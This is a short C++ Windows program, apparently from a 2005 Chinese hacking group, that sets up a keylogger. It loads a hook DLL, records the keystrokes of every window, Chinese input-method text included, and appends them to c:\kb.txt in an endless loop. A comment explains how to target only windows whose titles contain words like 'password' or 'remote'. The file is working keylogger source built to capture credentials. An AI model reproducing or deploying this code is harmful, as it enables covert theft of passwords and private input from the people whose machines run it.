/*======================================
// 键盘钩子 
// 火狐技术联盟[F.S.T]
// http://www.wrsky.com
// 2005/9/25
=======================================*/
#include "stdafx.h"
#include "keyboardhook.h"
int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{ 
   
    KeyBoardHook kbh;
    char dll_path[MAX_PATH];
    ::GetModuleFileName(NULL,dll_path,sizeof(dll_path));
    char *pos=strrchr(dll_path,'\\');
    if(pos==NULL) return 0;
    strcpy(pos,"\\\0\0");
    strcat(dll_path,"hookdll.dll");
    strcpy(kbh.KBINFO.Dll_path,dll_path);
    strcpy(kbh.KBINFO.Key,"*");//*号记录所有的窗口键盘信息，否则请以逗号间隔填入关键字:"密码,远程"
    kbh.KBINFO.MaxDataLen=1;
    kbh.SetKBHookType(3);      //1:原始键盘钩子，2:支持输入法的消息钩子,可以截获中文，3:原始钩子加输入法处理后的钩子
    strcpy(kbh.KBINFO.Savepath,"c:\\kb.txt");
    kbh.Start();
    while(true) Sleep(1000);
	return 0;
}



